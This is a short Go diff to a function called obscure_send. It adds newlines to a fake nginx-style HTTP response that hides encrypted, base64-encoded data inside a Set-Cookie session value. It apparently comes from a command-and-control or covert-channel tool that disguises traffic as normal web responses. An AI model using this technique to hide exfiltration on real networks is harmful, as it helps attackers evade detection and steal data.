@@ -94,20 +94,20 @@ func obscure_send(data []byte, stype string) string {
             return string(get)
 
         case "http-server":
-            response := "HTTP/2.0 200 OK" +
-                        "content-encoding: gzip" +
-                        "content-type: text/html; charset=utf-8" +
-                        "pragma: no-cache" +
-                        "server: nginx" +
-                        "x-content-type-options: nosniff" +
-                        "x-frame-options: SAMEORIGIN" +
-                        "x-xss-protection: 1; mode=block" +
-                        "cache-control: no-cache, no-store, must-revalidate" +
-                        "expires: Thu, 21 Nov 2019 01:07:15 GMT" +
-                        "date: Thu, 21 Nov 2019 01:07:15 GMT" +
-                        "content-length: 30330" +
-                        "vary: Accept-Encoding" +
-                        "X-Firefox-Spdy: h2" +
+            response := "HTTP/2.0 200 OK\n" +
+                        "content-encoding: gzip\n" +
+                        "content-type: text/html; charset=utf-8\n" +
+                        "pragma: no-cache\n" +
+                        "server: nginx\n" +
+                        "x-content-type-options: nosniff\n" +
+                        "x-frame-options: SAMEORIGIN\n" +
+                        "x-xss-protection: 1; mode=block\n" +
+                        "cache-control: no-cache, no-store, must-revalidate\n" +
+                        "expires: Thu, 21 Nov 2019 01:07:15 GMT\n" +
+                        "date: Thu, 21 Nov 2019 01:07:15 GMT\n" +
+                        "content-length: 30330\n" +
+                        "vary: Accept-Encoding\n" +
+                        "X-Firefox-Spdy: h2\n" +
                         "Set-Cookie: Session=" + b64.StdEncoding.EncodeToString(Encrypt(data)) + "; Secure; Path=/; HttpOnly\n\n"
             return string(response)
 
